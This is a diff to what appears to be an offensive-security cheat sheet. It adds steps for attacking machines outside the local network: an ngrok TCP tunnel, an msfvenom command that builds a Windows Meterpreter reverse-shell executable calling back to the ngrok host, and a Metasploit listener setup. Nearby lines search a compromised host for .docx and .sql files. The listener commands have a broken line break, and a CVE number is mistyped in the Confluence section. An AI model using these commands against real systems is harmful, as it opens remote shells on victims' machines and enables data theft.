@@ -434,6 +434,31 @@ meterpreter> search -f *.docx
 meterpreter> search -f *.sql
 ```
 
+Attack outside of the LAN with ngrok:
+
+First step, set up a free account in ngrok then start ngrok:
+
+```
+./ngrok tcp 9999
+
+# Forwarding tcp://0.tcp.ngrok.io:19631 -> localhost:9999
+```
+
+Create malicious payload:
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19631 -f exe > payload.exe
+```
+Start listener:
+
+```
+use exploit/multi/handler 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST 0.0.0.0 set 
+LPORT 9999 
+exploit
+```
+
 # Confluence CVE-2022-26134:
 
 CVE-2022-26314 is an unauthenticated and remote OGNL injection vulnerability resulting in code execution in the context of the Confluence server (typically the confluence user on Linux installations). Given the nature of the vulnerability, internet-facing Confluence servers are at very high risk.
